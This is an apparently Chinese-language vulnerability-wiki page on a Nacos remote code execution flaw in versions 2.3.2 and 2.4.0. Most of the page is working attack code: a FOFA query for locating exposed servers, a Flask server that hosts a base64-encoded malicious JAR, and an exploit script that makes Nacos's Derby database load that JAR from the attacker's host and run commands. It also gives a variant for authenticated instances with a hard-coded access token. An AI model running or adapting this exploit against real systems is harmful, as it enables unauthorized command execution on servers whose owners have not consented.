<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Nacos/Nacos%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Nacos远程代码执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Nacos\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u5f71\u54cd\u7248\u672c", url: "#_1" },
              {title: "fofa", url: "#fofa" },
              {title: "poc", url: "#poc" },
              {title: "Nacos\u5f00\u542f\u9274\u6743", url: "#nacos_1" },
              {title: "\u6f0f\u6d1e\u6765\u6e90", url: "#_2" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Nacos%E9%BB%98%E8%AE%A4key%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E7%99%BB%E9%99%86%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Nacos%E9%BB%98%E8%AE%A4key%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E7%99%BB%E9%99%86%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Nacos默认key导致权限绕过登陆漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Nacos%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%28CVE-2021-29441%29/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Nacos%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%28CVE-2021-29441%29/" class="btn btn-xs btn-link">
        Nacos未授权访问漏洞(CVE-2021-29441)
      </a>
    </div>
    
  </div>

    

    <h1 id="nacos">Nacos远程代码执行漏洞<a class="headerlink" href="#nacos" title="Permanent link">&para;</a></h1>
<h2 id="_1">影响版本<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code><span class="l l-Scalar l-Scalar-Plain">nacos 2.3.2</span><span class="w"> </span>
<span class="l l-Scalar l-Scalar-Plain">nacos 2.4.0</span>
</code></pre></div>
<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code><span class="l l-Scalar l-Scalar-Plain">title=&quot;Nacos&quot;</span>
</code></pre></div>
<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
<h3 id="servicepy">service.py<a class="headerlink" href="#servicepy" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">send_file</span><span class="p">,</span><span class="n">Response</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">config</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;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&#39;</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/download&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">download_file</span><span class="p">():</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">Response</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">mimetype</span><span class="o">=</span><span class="s2">&quot;application/octet-stream&quot;</span><span class="p">)</span>
    <span class="c1"># response.headers[&quot;Content-Disposition&quot;] = &quot;attachment; filename=file.bin&quot;</span>
    <span class="k">return</span> <span class="n">response</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
</code></pre></div>
<h3 id="exppy">exp.py<a class="headerlink" href="#exppy" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">urllib.parse</span><span class="w"> </span><span class="kn">import</span> <span class="n">urljoin</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">config</span>


<span class="c1"># 按装订区域中的绿色按钮以运行脚本。</span>
<span class="k">def</span><span class="w"> </span><span class="nf">exploit</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">command</span><span class="p">,</span> <span class="n">service</span><span class="p">):</span>
    <span class="n">removal_url</span> <span class="o">=</span> <span class="n">urljoin</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="s1">&#39;/nacos/v1/cs/ops/data/removal&#39;</span><span class="p">)</span>
    <span class="n">derby_url</span> <span class="o">=</span> <span class="n">urljoin</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="s1">&#39;/nacos/v1/cs/ops/derby&#39;</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">sys</span><span class="o">.</span><span class="n">maxsize</span><span class="p">):</span>
        <span class="nb">id</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">sample</span><span class="p">(</span><span class="s1">&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><span class="p">,</span><span class="mi">8</span><span class="p">))</span>
        <span class="n">post_sql</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;CALL sqlj.install_jar(&#39;</span><span class="si">{service}</span><span class="s2">&#39;, &#39;NACOS.</span><span class="si">{id}</span><span class="s2">&#39;, 0)</span><span class="se">\n</span>
<span class="s2">        CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(&#39;derby.database.classpath&#39;,&#39;NACOS.</span><span class="si">{id}</span><span class="s2">&#39;)</span><span class="se">\n</span>
<span class="s2">        CREATE FUNCTION S_EXAMPLE_</span><span class="si">{id}</span><span class="s2">( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME &#39;test.poc.Example.exec&#39;</span><span class="se">\n</span><span class="s2">&quot;&quot;&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">,</span><span class="n">service</span><span class="o">=</span><span class="n">service</span><span class="p">);</span>
        <span class="n">option_sql</span> <span class="o">=</span> <span class="s2">&quot;UPDATE ROLES SET ROLE=&#39;1&#39; WHERE ROLE=&#39;1&#39; AND ROLE=S_EXAMPLE_</span><span class="si">{id}</span><span class="s2">(&#39;</span><span class="si">{cmd}</span><span class="s2">&#39;)</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">,</span><span class="n">cmd</span><span class="o">=</span><span class="n">command</span><span class="p">);</span>
        <span class="n">get_sql</span> <span class="o">=</span> <span class="s2">&quot;select * from (select count(*) as b, S_EXAMPLE_</span><span class="si">{id}</span><span class="s2">(&#39;</span><span class="si">{cmd}</span><span class="s2">&#39;) as a from config_info) tmp /*ROWS FETCH NEXT*/&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">,</span><span class="n">cmd</span><span class="o">=</span><span class="n">command</span><span class="p">);</span>
        <span class="c1">#get_sql = &quot;select * from users /*ROWS FETCH NEXT*/&quot;.format(id=id,cmd=command);</span>
        <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="n">post_sql</span><span class="p">}</span>
        <span class="n">post_resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">removal_url</span><span class="p">,</span><span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
        <span class="n">post_json</span> <span class="o">=</span> <span class="n">post_resp</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">post_json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span><span class="kc">None</span><span class="p">)</span> <span class="ow">is</span> <span class="kc">None</span> <span class="ow">and</span> <span class="n">post_json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;data&#39;</span><span class="p">,</span><span class="kc">None</span><span class="p">)</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="n">post_resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
            <span class="n">get_resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">derby_url</span><span class="p">,</span><span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;sql&#39;</span><span class="p">:</span><span class="n">get_sql</span><span class="p">})</span>
            <span class="nb">print</span><span class="p">(</span><span class="n">get_resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
            <span class="k">break</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">service</span> <span class="o">=</span> <span class="s1">&#39;http://</span><span class="si">{host}</span><span class="s1">:</span><span class="si">{port}</span><span class="s1">/download&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">config</span><span class="o">.</span><span class="n">server_host</span><span class="p">,</span><span class="n">port</span><span class="o">=</span><span class="n">config</span><span class="o">.</span><span class="n">server_port</span><span class="p">)</span>
    <span class="n">target</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1:8848&#39;</span>
    <span class="n">command</span> <span class="o">=</span> <span class="s1">&#39;calc&#39;</span>
    <span class="n">target</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s1">&#39;请输入目录URL，默认：http://127.0.0.1:8848：&#39;</span><span class="p">)</span> <span class="ow">or</span> <span class="n">target</span>
    <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s1">&#39;请输入命令，默认：calc：&#39;</span><span class="p">)</span> <span class="ow">or</span> <span class="n">command</span>
    <span class="n">exploit</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">target</span><span class="p">,</span> <span class="n">command</span><span class="o">=</span><span class="n">command</span><span class="p">,</span><span class="n">service</span><span class="o">=</span><span class="n">service</span><span class="p">)</span>
</code></pre></div>
<p>首先运行  service.py</p>
<p><img alt="image-20240715172141600" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407151723092.png" /></p>
<p>接着运行exp.py</p>
<p><img alt="image-20240715172307594" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407151723670.png" /></p>
<h2 id="nacos_1">Nacos开启鉴权<a class="headerlink" href="#nacos_1" title="Permanent link">&para;</a></h2>
<p>可以结合弱口令或者其他漏洞获取到 <code>accesstoken</code> 后进行RCE</p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">urllib.parse</span><span class="w"> </span><span class="kn">import</span> <span class="n">urljoin</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">config</span>

<span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;accesstoken&quot;</span><span class="p">:</span><span class="s2">&quot;eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcyMTA1OTk4N30.fq5BNRx6wUHZSDutEqFEmSqAd3Hw6E04FBYyEWiR82g&quot;</span><span class="p">}</span>
<span class="c1"># 按装订区域中的绿色按钮以运行脚本。</span>
<span class="k">def</span><span class="w"> </span><span class="nf">exploit</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">command</span><span class="p">,</span> <span class="n">service</span><span class="p">):</span>
    <span class="n">removal_url</span> <span class="o">=</span> <span class="n">urljoin</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="s1">&#39;/nacos/v1/cs/ops/data/removal&#39;</span><span class="p">)</span>
    <span class="n">derby_url</span> <span class="o">=</span> <span class="n">urljoin</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="s1">&#39;/nacos/v1/cs/ops/derby&#39;</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">sys</span><span class="o">.</span><span class="n">maxsize</span><span class="p">):</span>
        <span class="nb">id</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">sample</span><span class="p">(</span><span class="s1">&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><span class="p">,</span><span class="mi">8</span><span class="p">))</span>
        <span class="n">post_sql</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;CALL sqlj.install_jar(&#39;</span><span class="si">{service}</span><span class="s2">&#39;, &#39;NACOS.</span><span class="si">{id}</span><span class="s2">&#39;, 0)</span><span class="se">\n</span>
<span class="s2">        CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(&#39;derby.database.classpath&#39;,&#39;NACOS.</span><span class="si">{id}</span><span class="s2">&#39;)</span><span class="se">\n</span>
<span class="s2">        CREATE FUNCTION S_EXAMPLE_</span><span class="si">{id}</span><span class="s2">( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME &#39;test.poc.Example.exec&#39;</span><span class="se">\n</span><span class="s2">&quot;&quot;&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">,</span><span class="n">service</span><span class="o">=</span><span class="n">service</span><span class="p">);</span>
        <span class="n">option_sql</span> <span class="o">=</span> <span class="s2">&quot;UPDATE ROLES SET ROLE=&#39;1&#39; WHERE ROLE=&#39;1&#39; AND ROLE=S_EXAMPLE_</span><span class="si">{id}</span><span class="s2">(&#39;</span><span class="si">{cmd}</span><span class="s2">&#39;)</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">,</span><span class="n">cmd</span><span class="o">=</span><span class="n">command</span><span class="p">);</span>
        <span class="n">get_sql</span> <span class="o">=</span> <span class="s2">&quot;select * from (select count(*) as b, S_EXAMPLE_</span><span class="si">{id}</span><span class="s2">(&#39;</span><span class="si">{cmd}</span><span class="s2">&#39;) as a from config_info) tmp /*ROWS FETCH NEXT*/&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">,</span><span class="n">cmd</span><span class="o">=</span><span class="n">command</span><span class="p">);</span>
        <span class="c1">#get_sql = &quot;select * from users /*ROWS FETCH NEXT*/&quot;.format(id=id,cmd=command);</span>
        <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="n">post_sql</span><span class="p">}</span>
        <span class="n">post_resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">removal_url</span><span class="p">,</span><span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
        <span class="n">post_json</span> <span class="o">=</span> <span class="n">post_resp</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">post_json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span><span class="kc">None</span><span class="p">)</span> <span class="ow">is</span> <span class="kc">None</span> <span class="ow">and</span> <span class="n">post_json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;data&#39;</span><span class="p">,</span><span class="kc">None</span><span class="p">)</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="n">post_resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
            <span class="n">get_resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">derby_url</span><span class="p">,</span><span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;sql&#39;</span><span class="p">:</span><span class="n">get_sql</span><span class="p">},</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="n">get_resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
            <span class="k">break</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">service</span> <span class="o">=</span> <span class="s1">&#39;http://</span><span class="si">{host}</span><span class="s1">:</span><span class="si">{port}</span><span class="s1">/download&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">config</span><span class="o">.</span><span class="n">server_host</span><span class="p">,</span><span class="n">port</span><span class="o">=</span><span class="n">config</span><span class="o">.</span><span class="n">server_port</span><span class="p">)</span>
    <span class="n">target</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1:8848&#39;</span>
    <span class="n">command</span> <span class="o">=</span> <span class="s1">&#39;calc&#39;</span>
    <span class="n">target</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s1">&#39;请输入目录URL，默认：http://127.0.0.1:8848：&#39;</span><span class="p">)</span> <span class="ow">or</span> <span class="n">target</span>
    <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s1">&#39;请输入命令，默认：calc：&#39;</span><span class="p">)</span> <span class="ow">or</span> <span class="n">command</span>
    <span class="n">exploit</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">target</span><span class="p">,</span> <span class="n">command</span><span class="o">=</span><span class="n">command</span><span class="p">,</span><span class="n">service</span><span class="o">=</span><span class="n">service</span><span class="p">)</span>
</code></pre></div>
<h2 id="_2">漏洞来源<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<ul>
<li><a href="https://github.com/ayoundzw/nacos-poc">https://github.com/ayoundzw/nacos-poc</a></li>
</ul>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Nacos%E9%BB%98%E8%AE%A4key%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E7%99%BB%E9%99%86%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Nacos%E9%BB%98%E8%AE%A4key%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E7%99%BB%E9%99%86%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Nacos默认key导致权限绕过登陆漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Nacos%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%28CVE-2021-29441%29/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Nacos%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%28CVE-2021-29441%29/" class="btn btn-xs btn-link">
        Nacos未授权访问漏洞(CVE-2021-29441)
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>